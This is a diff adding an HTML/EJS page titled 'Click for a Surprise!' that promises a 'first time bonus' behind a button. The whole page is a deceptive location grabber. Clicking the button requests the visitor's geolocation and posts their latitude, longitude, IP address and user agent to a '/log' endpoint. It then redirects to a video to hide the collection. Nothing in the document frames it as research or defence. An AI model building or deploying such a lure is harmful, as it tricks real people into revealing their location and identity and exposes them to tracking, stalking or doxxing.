@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Click for a Surprise!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      background-color: #44ff4d;
+      color: white;
+      font-size: 20px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #ff2222;
+    }
+  </style>
+</head>
+<body>
+  <h2>🎁 Click the button below to get a first time bonus! 🎁</h2>
+  <button onclick="getLocation()">Get Bonus</button>
+
+  <script>
+    const ip = "<%= ip %>";
+    const userAgent = "<%= userAgent %>";
+    const videoUrl = "<%= videoUrl %>";
+
+    function sendData(lat, lon) {
+      fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ lat, lon, ip, userAgent })
+      }).then(() => {
+        window.location.href = videoUrl;
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => sendData(pos.coords.latitude, pos.coords.longitude),
+          err => sendData('Permission Denied', 'Permission Denied')
+        );
+      } else {
+        sendData('Not Supported', 'Not Supported');
+      }
+    }
+  </script>
+</body>
+</html>
